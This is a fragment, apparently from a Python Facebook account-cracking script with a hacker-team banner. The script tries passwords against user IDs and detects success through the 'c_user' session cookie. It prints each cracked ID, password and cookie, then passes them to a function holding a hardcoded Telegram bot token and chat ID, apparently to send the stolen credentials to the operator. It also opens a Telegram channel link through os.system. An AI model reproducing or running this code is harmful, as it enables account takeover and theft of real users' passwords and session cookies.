...
oks = []
twf = []
os.system('xdg-open https://t.me/UU88QQ1')
...
logo = """
 ...
 \x1b[1;92m##     ## ##       ##     ## ##   ### ## 
 \x1b[1;97m##     ## ########  #######  ##    ## ########
 \x1b[1;92m        UPDATED BY  : MRSH4MUL / TEAM-HUNTER REVULATION-X
\033[1;91m=========================================================="""
...
def Elite(uid,ps,coki):
    try:
        import requests
        token = "7833176346:AAHpgFx6CVUSZeujGGpiY8qnWtIM2yPs4vw"# 
        chatid = "6573552662"#
        ...
        for ps in pwx:
           ...
           'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[232:247]
                print(f'\r{GREEN}[ALONE-OK] '+uid+' | '+ps+'\n'f'{YELLOW}'+coki+'')
                Elite(uid,ps,coki)
                oks.append(cid) 
